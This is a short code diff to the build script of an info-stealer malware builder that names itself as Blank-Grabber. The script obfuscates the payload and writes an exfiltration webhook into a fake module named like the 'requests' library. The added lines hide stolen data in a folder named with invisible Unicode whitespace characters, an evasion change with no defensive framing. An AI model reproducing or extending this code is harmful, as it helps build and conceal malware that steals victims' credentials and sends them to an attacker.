@@ -10,6 +10,7 @@ with open("config.txt") as config:
 subprocess.run("python obf.py -o main-o.py main-o.py", shell= True, capture_output= True)
 
 with open("./module/requests/__init__.py", "w", encoding= "utf-8") as file:
-    file.write(f'__author__ = "Blank-c"\n__github__ = "https://github.com/Blank-c/Blank-Grabber"\nWEBHOOK = "{hook}"')
+    HIDDEN_FOLDER = "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= 10))
+    file.write(f'__author__ = "Blank-c"\n__github__ = "https://github.com/Blank-c/Blank-Grabber"\nWEBHOOK = "{hook}"\nHIDDEN_FOLDER = "{HIDDEN_FOLDER}"')
 
 subprocess.run("pip install -e .", shell= True, capture_output= True, cwd= "./module")
